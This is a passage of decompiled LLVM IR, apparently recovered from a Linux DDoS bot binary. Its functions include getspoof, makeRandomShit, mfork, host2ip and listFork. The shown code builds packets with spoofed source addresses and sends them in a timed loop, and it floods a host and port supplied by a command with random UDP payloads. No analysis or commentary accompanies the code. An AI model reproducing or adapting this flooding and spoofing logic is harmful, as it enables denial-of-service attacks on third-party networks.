  %v2_804ef74 = or i8 %stack_var_-87.138, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804ef74 = zext i8 %v2_804ef74 to i32
  store i32 %v7_804ef74, i32* @eax, align 4
  br label %dec_label_pc_804f01c

dec_label_pc_804ef7e:                             ; preds = %dec_label_pc_804ef2b
  store i1 false, i1* @df, align 1
  store i32 %v3_804efce.in, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_806a7f0.153 to i32), i32* @edi, align 4
  %v7_804efae = call i32 @_strncmp(i8* %v3_804efce, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806a7f0.153, i32 0, i32 0), i32 4)
  %v8_804efae = urem i32 %v7_804efae, 2
  %v9_804efae = icmp eq i32 %v8_804efae, 0
  %v0_804efb0 = load i1, i1* %cf.global-to-local, align 1
  %v2_804efb0 = or i1 %v0_804efb0, %v9_804efae
  %v3_804efb0 = zext i1 %v2_804efb0 to i32
  %v4_804efb0 = load i32, i32* @edx, align 4
  %v5_804efb0 = and i32 %v4_804efb0, -256
  %v6_804efb0 = or i32 %v3_804efb0, %v5_804efb0
  %v7_804efb0 = xor i32 %v6_804efb0, 1
  store i32 %v7_804efb0, i32* @edx, align 4
  %v3_804efb6 = and i32 %v7_804efae, -256
  %v1_804efb8 = trunc i32 %v7_804efb0 to i8
  %v3_804efb8 = zext i1 %v0_804efb0 to i8
  %v4_804efb8 = sub nsw i8 %v1_804efb8, %v3_804efb8
  %v15_804efb8 = icmp eq i8 %v4_804efb8, 0
  %v20_804efb8 = zext i8 %v4_804efb8 to i32
  %v23_804efb8 = or i32 %v20_804efb8, %v3_804efb6
  store i32 %v23_804efb8, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804efc1 = icmp eq i1 %v15_804efb8, false
  br i1 %v1_804efc1, label %dec_label_pc_804efce, label %dec_label_pc_804efc3

dec_label_pc_804efc3:                             ; preds = %dec_label_pc_804ef7e
  %v2_804efc7 = or i8 %stack_var_-87.138, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804efc7 = zext i8 %v2_804efc7 to i32
  store i32 %v7_804efc7, i32* @eax, align 4
  br label %dec_label_pc_804f01c

dec_label_pc_804efce:                             ; preds = %dec_label_pc_804ef7e
  store i1 false, i1* @df, align 1
  store i32 %v3_804efce.in, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_806a7f4.154 to i32), i32* @edi, align 4
  %v7_804effe = call i32 @_strncmp(i8* %v3_804efce, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806a7f4.154, i32 0, i32 0), i32 4)
  %v8_804effe = urem i32 %v7_804effe, 2
  %v9_804effe = icmp eq i32 %v8_804effe, 0
  %v0_804f000 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f000 = or i1 %v0_804f000, %v9_804effe
  %v3_804f000 = zext i1 %v2_804f000 to i32
  %v4_804f000 = load i32, i32* @edx, align 4
  %v5_804f000 = and i32 %v4_804f000, -256
  %v6_804f000 = or i32 %v3_804f000, %v5_804f000
  %v7_804f000 = xor i32 %v6_804f000, 1
  store i32 %v7_804f000, i32* @edx, align 4
  %v3_804f006 = and i32 %v7_804effe, -256
  %v1_804f008 = trunc i32 %v7_804f000 to i8
  %v3_804f008 = zext i1 %v0_804f000 to i8
  %v4_804f008 = sub nsw i8 %v1_804f008, %v3_804f008
  %v15_804f008 = icmp eq i8 %v4_804f008, 0
  %v20_804f008 = zext i8 %v4_804f008 to i32
  %v23_804f008 = or i32 %v20_804f008, %v3_804f006
  store i32 %v23_804f008, i32* @ecx, align 4
  %v2_804f00c = sext i8 %v4_804f008 to i32
  store i32 %v2_804f00c, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f011 = icmp eq i1 %v15_804f008, false
  br i1 %v1_804f011, label %dec_label_pc_804f01c, label %dec_label_pc_804f013

dec_label_pc_804f013:                             ; preds = %dec_label_pc_804efce
  %v2_804f017 = or i8 %stack_var_-87.138, 32
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804f017 = zext i8 %v2_804f017 to i32
  store i32 %v7_804f017, i32* @eax, align 4
  br label %dec_label_pc_804f01c

dec_label_pc_804f01c:                             ; preds = %dec_label_pc_804efce, %dec_label_pc_804efc3, %dec_label_pc_804ef70, %dec_label_pc_804ef1d, %dec_label_pc_804eeca, %dec_label_pc_804ee77, %dec_label_pc_804f013
  %stack_var_-87.0 = phi i8 [ %stack_var_-87.138, %dec_label_pc_804efce ], [ %v2_804f017, %dec_label_pc_804f013 ], [ %v2_804efc7, %dec_label_pc_804efc3 ], [ %v2_804ef74, %dec_label_pc_804ef70 ], [ %v2_804ef21, %dec_label_pc_804ef1d ], [ %v2_804eece, %dec_label_pc_804eeca ], [ %v2_804ee7b, %dec_label_pc_804ee77 ]
  %v2_804f02b = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_806a7de.148 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804f033 = icmp eq i32 %v2_804f02b, 0
  %v1_804f037 = icmp eq i1 %v5_804f033, false
  br i1 %v1_804f037, label %dec_label_pc_804ee32, label %dec_label_pc_804f03d

dec_label_pc_804f03d:                             ; preds = %dec_label_pc_804f01c, %dec_label_pc_804ee12, %dec_label_pc_804edf2, %dec_label_pc_804ed91, %dec_label_pc_804ed30, %dec_label_pc_804ecc6, %dec_label_pc_804ec41
  %v2_804f0f8 = ptrtoint i8* %stack_var_-120 to i32
  %v2_804f106 = bitcast i8* %stack_var_-120 to i16*
  %v2_804f182 = ptrtoint i32* %stack_var_-172 to i32
  %v2_804f188 = ptrtoint i32* %stack_var_-160 to i32
  %v5_804f18e = icmp ugt i8* %stack_var_-120, inttoptr (i32 -21 to i8*)
  %v15_804f18e = ptrtoint i32* %stack_var_-100 to i32
  %v12_804f1b2 = ptrtoint i32* %stack_var_-140 to i32
  %v5_804f1bc = icmp ugt i8* %stack_var_-120, inttoptr (i32 -41 to i8*)
  %v15_804f1bc = ptrtoint i32* %stack_var_-80 to i32
  %v2_804f1da = bitcast i32* %stack_var_-172 to i16*
  %v2_804f1e6 = ptrtoint i32* %stack_var_-188 to i32
  %v5_804f233 = add i32 %v1_804eb35, %v2_804ea75
  br label %dec_label_pc_804f06e

dec_label_pc_804f06e:                             ; preds = %dec_label_pc_804f24d, %dec_label_pc_804f03d
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_804f03d ], [ %v4_804f24d, %dec_label_pc_804f24d ]
  %v2_804f07c = call i32 @realrand(i32 0, i32 31)
  %v0_804f081 = load i32, i32* @ebp, align 4
  %v2_804f081 = mul i32 %v2_804f07c, 4
  %v3_804f081 = add i32 %v2_804f081, -392
  %v4_804f081 = add i32 %v3_804f081, %v0_804f081
  %v5_804f081 = inttoptr i32 %v4_804f081 to i32*
  %v6_804f081 = load i32, i32* %v5_804f081, align 4
  %v1_804f08b = call i32 @getspoof(i32 %v6_804f081)
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804f0a2 = call i32 @htons(i16 60)
  %v1_804f0ae = call i32 @random()
  %v1_804f0c9 = urem i32 %v1_804f08b, 65536
  store i32 %v1_804f0c9, i32* %stack_var_-100, align 4
  %v1_804f0da = call i32 @random()
  %v3_804f106 = call i32 @in_cksum(i16* %v2_804f106, i32 20)
  %v1_804f112 = call i32 @random()
  store i32 %v1_804f08b, i32* %stack_var_-172, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804f173 = call i32 @htons(i16 40)
  store i32 %v2_804f188, i32* %edx.global-to-local, align 4
  store i1 %v5_804f18e, i1* %cf.global-to-local, align 1
  %v3_804f1a0 = call i32 @bcopy(i32 %v15_804f18e, i32 %v2_804f188, i32 20)
  store i1 %v5_804f1bc, i1* %cf.global-to-local, align 1
  %v3_804f1c2 = call i32 @bcopy(i32 %v15_804f1bc, i32 %v12_804f1b2, i32 20)
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v2_804f182, i32* %edx.global-to-local, align 4
  %v3_804f1da = call i32 @in_cksum(i16* %v2_804f1da, i32 52)
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 60, i32* %edx.global-to-local, align 4
  %v6_804f217 = call i32 @sendto(i32 %v3_804eaa7, i32 %v2_804f0f8, i32 60, i32 0, i32 %v2_804f1e6, i32 16)
  %v8_804f21c = icmp ult i32 %stack_var_-60.0, 99
  store i1 %v8_804f21c, i1* %cf.global-to-local, align 1
  %tmp = icmp ult i32 %stack_var_-60.0, 100
  br i1 %tmp, label %dec_label_pc_804f24d, label %dec_label_pc_804f222

dec_label_pc_804f222:                             ; preds = %dec_label_pc_804f06e
  %v2_804f229 = call i32 @__GI_time(i32* null)
  store i32 %v2_804f229, i32* %edx.global-to-local, align 4
  %v7_804f236 = icmp ult i32 %v2_804f229, %v5_804f233
  store i1 %v7_804f236, i1* %cf.global-to-local, align 1
  br i1 %v7_804f236, label %dec_label_pc_804f24d, label %dec_label_pc_804f23a

dec_label_pc_804f23a:                             ; preds = %dec_label_pc_804f222
  %v1_804f241 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804f24d

dec_label_pc_804f24d:                             ; preds = %dec_label_pc_804f23a, %dec_label_pc_804f222, %dec_label_pc_804f06e
  %stack_var_-60.1 = phi i32 [ %stack_var_-60.0, %dec_label_pc_804f06e ], [ 0, %dec_label_pc_804f222 ], [ 0, %dec_label_pc_804f23a ]
  %v4_804f24d = add i32 %stack_var_-60.1, 1
  br label %dec_label_pc_804f06e

dec_label_pc_804f255:                             ; preds = %entry
  %v0_804f255 = load i32, i32* @esp, align 4
  %v2_804f255 = icmp ugt i32 %v0_804f255, -545
  store i1 %v2_804f255, i1* %cf.global-to-local, align 1
  ret i32 %v1_804ea83

; uselistorder directives
  uselistorder i32 %v1_804f08b, { 1, 0 }
  uselistorder i32 %stack_var_-60.0, { 1, 0, 2 }
  uselistorder i32 %v2_804f02b, { 1, 0 }
  uselistorder i1 %v0_804f000, { 1, 0 }
  uselistorder i32 %v7_804effe, { 1, 0 }
  uselistorder i1 %v0_804efb0, { 1, 0 }
  uselistorder i32 %v7_804efae, { 1, 0 }
  uselistorder i1 %v0_804ef5d, { 1, 0 }
  uselistorder i32 %v7_804ef5b, { 1, 0 }
  uselistorder i1 %v0_804ef0a, { 1, 0 }
  uselistorder i32 %v7_804ef08, { 1, 0 }
  uselistorder i1 %v0_804eeb7, { 1, 0 }
  uselistorder i32 %v7_804eeb5, { 1, 0 }
  uselistorder i1 %v0_804ee64, { 1, 0 }
  uselistorder i32 %v7_804ee62, { 1, 0 }
  uselistorder i1 %v0_804eddf, { 1, 0 }
  uselistorder i32 %v7_804eddd, { 1, 0 }
  uselistorder i1 %v0_804ed7e, { 1, 0 }
  uselistorder i1 %v0_804ed1d, { 1, 0 }
  uselistorder i1 %v0_804ecb3, { 1, 0 }
  uselistorder i1 %v0_804ec2e, { 1, 0 }
  uselistorder i32 %v4_804eb07, { 1, 0, 2 }
  uselistorder i32 %storemerge142, { 2, 3, 0, 1 }
  uselistorder i32 %v4_804eac1, { 1, 0 }
  uselistorder i32* %stack_var_-172, { 1, 0, 2 }
  uselistorder i32* %stack_var_-188, { 1, 0 }
  uselistorder i1* %cf.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 26, 9, 10, 12, 11, 13, 15, 14, 16, 18, 17, 19, 21, 20, 22, 24, 23, 25, 56, 57, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 58, 52, 53, 54, 55 }
  uselistorder i32 %arg4, { 4, 5, 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f01c, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_804ee32, { 1, 0 }
  uselistorder label %dec_label_pc_804eaf6, { 1, 0 }
  uselistorder label %dec_label_pc_804eb0a.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804eac1, { 1, 0 }
}

define i32 @makeRandomShit(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804f262 = load i32, i32* @esi, align 4
  %v0_804f263 = load i32, i32* @ebx, align 4
  store i32 %v0_804f263, i32* %stack_var_-12, align 4
  %v2_804f26e = call i32 @__GI_time(i32* null)
  %v1_804f276 = call i32 @srand(i32 %v2_804f26e)
  %v5_804f290 = ptrtoint i8* %arg1 to i32
  %v5_804f2db17 = icmp sgt i32 %arg2, 0
  br i1 %v5_804f2db17, label %dec_label_pc_804f28b, label %dec_label_pc_804f2dd

dec_label_pc_804f28b:                             ; preds = %entry, %dec_label_pc_804f28b
  %storemerge18 = phi i32 [ %v4_804f2d2, %dec_label_pc_804f28b ], [ 0, %entry ]
  %v6_804f290 = add i32 %storemerge18, %v5_804f290
  store i32 %v6_804f290, i32* @ebx, align 4
  %v0_804f293 = call i32 @random()
  store i32 %v0_804f293, i32* @ecx, align 4
  %v2_804f2b5 = sdiv i32 %v0_804f293, 51
  store i32 %v2_804f2b5, i32* @esi, align 4
  %tmp19 = mul i32 %v2_804f2b5, -255
  %v2_804f2c5 = add i32 %v0_804f293, %tmp19
  %v14_804f2c5 = trunc i32 %v2_804f2c5 to i8
  %v2_804f2ce = add i8 %v14_804f2c5, 1
  %v2_804f2d0 = load i32, i32* @ebx, align 4
  %v3_804f2d0 = inttoptr i32 %v2_804f2d0 to i8*
  store i8 %v2_804f2ce, i8* %v3_804f2d0, align 1
  %v4_804f2d2 = add nuw nsw i32 %storemerge18, 1
  %exitcond = icmp eq i32 %v4_804f2d2, %arg2
  br i1 %exitcond, label %dec_label_pc_804f2dd, label %dec_label_pc_804f28b

dec_label_pc_804f2dd:                             ; preds = %dec_label_pc_804f28b, %entry
  %storemerge.lcssa = phi i32 [ 0, %entry ], [ %arg2, %dec_label_pc_804f28b ]
  %v2_804f2e0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f2e0, i32* @ebx, align 4
  store i32 %v0_804f262, i32* @esi, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_804f2d2, { 1, 0 }
  uselistorder i32 %v2_804f2b5, { 1, 0 }
  uselistorder i32 %v0_804f293, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f28b, { 1, 0 }
}

define i32 @unknown(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804f2e8 = load i32, i32* @esi, align 4
  store i32 %v0_804f2e8, i32* %stack_var_-12, align 4
  %v2_804f2e9 = icmp ugt i32* %stack_var_-12, inttoptr (i32 127 to i32*)
  store i1 %v2_804f2e9, i1* %cf.global-to-local, align 1
  %v2_804f301 = call i32 @__GI_time(i32* null)
  %v4_804f309 = add i32 %arg3, -3
  %v8_804f309 = icmp ult i32 %arg3, 3
  %v9_804f309 = sub i32 2, %arg3
  %v10_804f309 = and i32 %v9_804f309, %arg3
  %v11_804f309 = icmp slt i32 %v10_804f309, 0
  store i1 %v8_804f309, i1* %cf.global-to-local, align 1
  %v12_804f309 = icmp eq i32 %v4_804f309, 0
  %v13_804f309 = icmp slt i32 %v4_804f309, 0
  %v3_804f30d = icmp eq i1 %v13_804f309, %v11_804f309
  %v4_804f30d = icmp eq i1 %v12_804f309, false
  %v5_804f30d = and i1 %v4_804f30d, %v3_804f30d
  br i1 %v5_804f30d, label %dec_label_pc_804f335, label %dec_label_pc_804f30f

dec_label_pc_804f30f:                             ; preds = %entry
  %v3_804f324 = call i32 @Send(i32 %arg1, i32 ptrtoint ([85 x i8]* @global_var_806a7f8.155 to i32))
  %v1_804f330 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804f335

dec_label_pc_804f335:                             ; preds = %entry, %dec_label_pc_804f30f
  %v1_804f33b = call i32 @mfork(i32 %arg2)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f340 = icmp eq i32 %v1_804f33b, 0
  %v1_804f342 = icmp eq i1 %v1_804f340, false
  br i1 %v1_804f342, label %dec_label_pc_804f601, label %dec_label_pc_804f348

dec_label_pc_804f348:                             ; preds = %dec_label_pc_804f335
  %v1_804f34f = call i32 @malloc(i32 1024)
  %v4_804f36d = inttoptr i32 %v1_804f34f to i8*
  %v5_804f36d = call i32 @__GI_memset(i8* %v4_804f36d, i32 0, i32 1024)
  %v1_804f375 = add i32 %arg4, 8
  %v5_804f375 = icmp ugt i32 %arg4, -9
  store i1 %v5_804f375, i1* %cf.global-to-local, align 1
  %v1_804f378 = inttoptr i32 %v1_804f375 to i32*
  %v2_804f378 = load i32, i32* %v1_804f378, align 4
  %v4_804f38c = inttoptr i32 %v2_804f378 to i8*
  %v7_804f395 = call i32 @_strncmp(i8* %v4_804f38c, i8* bitcast (i8** @global_var_806a84d.156 to i8*), i32 2)
  %v8_804f395 = urem i32 %v7_804f395, 2
  %v9_804f395 = icmp eq i32 %v8_804f395, 0
  %v0_804f397 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f397 = or i1 %v0_804f397, %v9_804f395
  %v3_804f397 = zext i1 %v2_804f397 to i32
  %v4_804f397 = load i32, i32* @edx, align 4
  %v5_804f397 = and i32 %v4_804f397, -256
  %v6_804f397 = or i32 %v3_804f397, %v5_804f397
  %v7_804f397 = xor i32 %v6_804f397, 1
  store i32 %v7_804f397, i32* %edx.global-to-local, align 4
  %v1_804f39f = trunc i32 %v7_804f397 to i8
  %v3_804f39f = zext i1 %v0_804f397 to i8
  %v15_804f39f = icmp eq i8 %v1_804f39f, %v3_804f39f
  %v1_804f3a8 = icmp eq i1 %v15_804f39f, false
  %v1_804f3b4 = add i32 %arg4, 12
  %v5_804f3b4 = icmp ugt i32 %arg4, -13
  store i1 %v5_804f3b4, i1* %cf.global-to-local, align 1
  %v1_804f3b7 = inttoptr i32 %v1_804f3b4 to i32*
  %v2_804f3b7 = load i32, i32* %v1_804f3b7, align 4
  store i1 false, i1* @df, align 1
  %v4_804f3cb = inttoptr i32 %v2_804f3b7 to i8*
  store i32 %v2_804f3b7, i32* @esi, align 4
  store i32 ptrtoint (i8** @global_var_806a84d.156 to i32), i32* @edi, align 4
  %v7_804f3d4 = call i32 @_strncmp(i8* %v4_804f3cb, i8* bitcast (i8** @global_var_806a84d.156 to i8*), i32 2)
  %v8_804f3d4 = urem i32 %v7_804f3d4, 2
  %v9_804f3d4 = icmp eq i32 %v8_804f3d4, 0
  %v0_804f3d6 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f3d6 = or i1 %v0_804f3d6, %v9_804f3d4
  %v3_804f3d6 = zext i1 %v2_804f3d6 to i32
  %v4_804f3d6 = load i32, i32* %edx.global-to-local, align 4
  %v5_804f3d6 = and i32 %v4_804f3d6, -256
  %v6_804f3d6 = or i32 %v3_804f3d6, %v5_804f3d6
  %v7_804f3d6 = xor i32 %v6_804f3d6, 1
  store i32 %v7_804f3d6, i32* %edx.global-to-local, align 4
  %v1_804f3de = trunc i32 %v7_804f3d6 to i8
  %v3_804f3de = zext i1 %v0_804f3d6 to i8
  %v15_804f3de = icmp eq i8 %v1_804f3de, %v3_804f3de
  %v1_804f3e7 = icmp eq i1 %v15_804f3de, false
  br i1 %v1_804f3e7, label %dec_label_pc_804f3f9, label %dec_label_pc_804f404

dec_label_pc_804f3f9:                             ; preds = %dec_label_pc_804f348
  br label %dec_label_pc_804f404

dec_label_pc_804f404:                             ; preds = %dec_label_pc_804f348, %dec_label_pc_804f3f9
  %storemerge = phi i1 [ %v5_804f3b4, %dec_label_pc_804f3f9 ], [ false, %dec_label_pc_804f348 ]
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_804f3f9 ], [ 1, %dec_label_pc_804f348 ]
  store i1 %storemerge, i1* %cf.global-to-local, align 1
  %v2_804f40b = call i32 @__GI_time(i32* null)
  %v1_804f413 = call i32 @srand(i32 %v2_804f40b)
  %v1_804f41b = add i32 %arg4, 16
  %v2_804f41b = icmp ugt i32 %arg4, -17
  store i1 %v2_804f41b, i1* %cf.global-to-local, align 1
  %v1_804f41e = inttoptr i32 %v1_804f41b to i32*
  %v2_804f41e = load i32, i32* %v1_804f41e, align 4
  %v1_804f423 = call i32 @atol(i32 %v2_804f41e)
  %v2_804f43b = ptrtoint i32* %stack_var_-72 to i32
  %v4_804f441 = bitcast i32* %stack_var_-72 to i8*
  %v5_804f441 = call i32 @__GI_memset(i8* %v4_804f441, i32 0, i32 16)
  %v1_804f449 = add i32 %arg4, 4
  %v5_804f449 = icmp ugt i32 %arg4, -5
  store i1 %v5_804f449, i1* %cf.global-to-local, align 1
  %v1_804f44c = inttoptr i32 %v1_804f449 to i32*
  %v2_804f44c = load i32, i32* %v1_804f44c, align 4
  %v3_804f458 = call i32 @host2ip(i32 %arg2, i32 %v2_804f44c)
  store i32 2, i32* %stack_var_-72, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f46a = icmp eq i1 %v1_804f3a8, false
  br i1 %v1_804f46a, label %dec_label_pc_804f499, label %dec_label_pc_804f46c

dec_label_pc_804f46c:                             ; preds = %dec_label_pc_804f404
  store i1 %v5_804f375, i1* %cf.global-to-local, align 1
  %v2_804f472 = load i32, i32* %v1_804f378, align 4
  %v1_804f477 = call i32 @atol(i32 %v2_804f472)
  %v1_804f482 = trunc i32 %v1_804f477 to i16
  %v2_804f482 = call i32 @htons(i16 %v1_804f482)
  store i1 %v5_804f3b4, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f499

dec_label_pc_804f499:                             ; preds = %dec_label_pc_804f404, %dec_label_pc_804f46c
  %v2_804f49f = load i32, i32* %v1_804f378, align 4
  store i32 %v2_804f49f, i32* %edx.global-to-local, align 4
  store i1 %v5_804f449, i1* %cf.global-to-local, align 1
  %v3_804f4cd = call i32 @Send(i32 %arg1, i32 ptrtoint ([49 x i8]* @global_var_806a858.158 to i32))
  %v8_804f4fe = icmp eq i32 %stack_var_-36.0, 0
  %v12_804f4fe = icmp eq i32 %stack_var_-36.0, 1
  %v5_804f5d4 = add i32 %v1_804f423, %v2_804f301
  %v1_804f4d6 = icmp eq i1 %v1_804f46a, false
  %v1_804f502 = icmp eq i1 %v12_804f4fe, false
  br label %dec_label_pc_804f4d2

dec_label_pc_804f4d2:                             ; preds = %dec_label_pc_804f5e2, %dec_label_pc_804f499
  %stack_var_-52.0 = phi i32 [ %tmp, %dec_label_pc_804f499 ], [ %v4_804f5e2, %dec_label_pc_804f5e2 ]
  store i1 %v1_804f3a8, i1* %cf.global-to-local, align 1
  br i1 %v1_804f4d6, label %dec_label_pc_804f4fe, label %dec_label_pc_804f4d8

dec_label_pc_804f4d8:                             ; preds = %dec_label_pc_804f4d2
  %v3_804f4e7 = call i32 @realrand(i32 1026, i32 65535)
  %v1_804f4f2 = trunc i32 %v3_804f4e7 to i16
  %v2_804f4f2 = call i32 @htons(i16 %v1_804f4f2)
  br label %dec_label_pc_804f4fe

dec_label_pc_804f4fe:                             ; preds = %dec_label_pc_804f4d2, %dec_label_pc_804f4d8
  store i1 %v8_804f4fe, i1* %cf.global-to-local, align 1
  br i1 %v1_804f502, label %dec_label_pc_804f529, label %dec_label_pc_804f504

dec_label_pc_804f504:                             ; preds = %dec_label_pc_804f4fe
  %v3_804f513 = call i32 @realrand(i32 64, i32 1024)
  %v4_804f522 = call i32 @makeRandomShit(i8* %v4_804f36d, i32 %v3_804f513)
  br label %dec_label_pc_804f548

dec_label_pc_804f529:                             ; preds = %dec_label_pc_804f4fe
  store i1 %v5_804f3b4, i1* %cf.global-to-local, align 1
  %v2_804f52f = load i32, i32* %v1_804f3b7, align 4
  %v1_804f534 = call i32 @atol(i32 %v2_804f52f)
  %v4_804f543 = call i32 @makeRandomShit(i8* %v4_804f36d, i32 %v1_804f534)
  br label %dec_label_pc_804f548

dec_label_pc_804f548:                             ; preds = %dec_label_pc_804f504, %dec_label_pc_804f529
  %v4_804f55f = call i32 @socket(i32 2, i32 2, i32 17)
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804f567 = icmp slt i32 %v4_804f55f, 0
  br i1 %v5_804f567, label %dec_label_pc_804f5bd, label %dec_label_pc_804f56d

dec_label_pc_804f56d:                             ; preds = %dec_label_pc_804f548
  store i32 %v2_804f43b, i32* %edx.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v1_804f34f, i32* @edi, align 4
  %v3_804f581 = call i32 @_strlen(i8* %v4_804f36d)
  %v4_804f581 = mul i32 %v3_804f581, -1
  %v5_804f581 = add i32 %v4_804f581, -2
  store i32 %v5_804f581, i32* @ecx, align 4
  %v1_804f587 = sub i32 0, %v4_804f581
  %v8_804f5ad = call i32 @sendto(i32 %v4_804f55f, i32 %v1_804f34f, i32 %v1_804f587, i32 0, i32 %v2_804f43b, i32 16)
  %v1_804f5b8 = call i32 @close(i32 %v4_804f55f)
  br label %dec_label_pc_804f5bd

dec_label_pc_804f5bd:                             ; preds = %dec_label_pc_804f548, %dec_label_pc_804f56d
  %v9_804f5bd = icmp ult i32 %stack_var_-52.0, 99
  store i1 %v9_804f5bd, i1* %cf.global-to-local, align 1
  %v7_804f5c1 = icmp sgt i32 %stack_var_-52.0, 99
  br i1 %v7_804f5c1, label %dec_label_pc_804f5c3, label %dec_label_pc_804f5e2

dec_label_pc_804f5c3:                             ; preds = %dec_label_pc_804f5bd
  %v2_804f5ca = call i32 @__GI_time(i32* null)
  store i32 %v2_804f5ca, i32* %edx.global-to-local, align 4
  %v7_804f5d7 = icmp ult i32 %v2_804f5ca, %v5_804f5d4
  store i1 %v7_804f5d7, i1* %cf.global-to-local, align 1
  %v1_804f5d9 = icmp eq i1 %v7_804f5d7, false
  br i1 %v1_804f5d9, label %dec_label_pc_804f5ea, label %dec_label_pc_804f5e2

dec_label_pc_804f5e2:                             ; preds = %dec_label_pc_804f5c3, %dec_label_pc_804f5bd
  %stack_var_-52.1 = phi i32 [ %stack_var_-52.0, %dec_label_pc_804f5bd ], [ 0, %dec_label_pc_804f5c3 ]
  %v4_804f5e2 = add i32 %stack_var_-52.1, 1
  br label %dec_label_pc_804f4d2

dec_label_pc_804f5ea:                             ; preds = %dec_label_pc_804f5c3
  %v1_804f5f0 = call i32 @close(i32 %v4_804f55f)
  %v1_804f5fc = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804f601

dec_label_pc_804f601:                             ; preds = %dec_label_pc_804f335, %dec_label_pc_804f5ea
  %v0_804f607 = phi i32 [ %v1_804f33b, %dec_label_pc_804f335 ], [ %v1_804f5fc, %dec_label_pc_804f5ea ]
  %v0_804f601 = load i32, i32* @esp, align 4
  %v2_804f601 = icmp ult i32 %v0_804f601, -128
  store i1 %v2_804f601, i1* %cf.global-to-local, align 1
  ret i32 %v0_804f607

; uselistorder directives
  uselistorder i32 %stack_var_-52.0, { 0, 2, 1 }
  uselistorder i1 %v0_804f3d6, { 1, 0 }
  uselistorder i1 %v5_804f3b4, { 2, 1, 0, 3 }
  uselistorder i1 %v0_804f397, { 1, 0 }
  uselistorder i32* %v1_804f378, { 1, 0, 2 }
  uselistorder i8* %v4_804f36d, { 1, 2, 0, 3 }
  uselistorder i32 %v4_804f309, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i1* %cf.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 (i32, i32)* @host2ip, { 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_806a84d.156, { 1, 0 }
  uselistorder i32 %arg4, { 6, 7, 4, 5, 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f601, { 1, 0 }
  uselistorder label %dec_label_pc_804f5bd, { 1, 0 }
  uselistorder label %dec_label_pc_804f548, { 1, 0 }
  uselistorder label %dec_label_pc_804f4fe, { 1, 0 }
  uselistorder label %dec_label_pc_804f499, { 1, 0 }
  uselistorder label %dec_label_pc_804f404, { 1, 0 }
  uselistorder label %dec_label_pc_804f335, { 1, 0 }
}

define i32 @listFork(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804f608 = load i32, i32* @ebp, align 4
  store i32 %v0_804f608, i32* %stack_var_-4, align 4
  %v4_804f608 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804f608, i32* @ebp, align 4
  %v1_804f60e = call i32 @fork(i32 %v0_804f608)
  %v4_804f616 = icmp eq i32 %v1_804f60e, 0
  %v1_804f61a = icmp eq i1 %v4_804f616, false
  br i1 %v1_804f61a, label %dec_label_pc_804f627, label %dec_label_pc_804f6ac

dec_label_pc_804f627:                             ; preds = %entry
  %v0_804f627 = load i32, i32* @global_var_80756d4.31, align 4
  %v1_804f62c = add i32 %v0_804f627, 1
  store i32 %v1_804f62c, i32* @global_var_80756d4.31, align 4
  %v2_804f637 = mul i32 %v1_804f62c, 4
  %v1_804f63a = add i32 %v2_804f637, 4
  %v1_804f640 = call i32 @malloc(i32 %v1_804f63a)
  %v0_804f6739 = load i32, i32* @global_var_80756d4.31, align 4
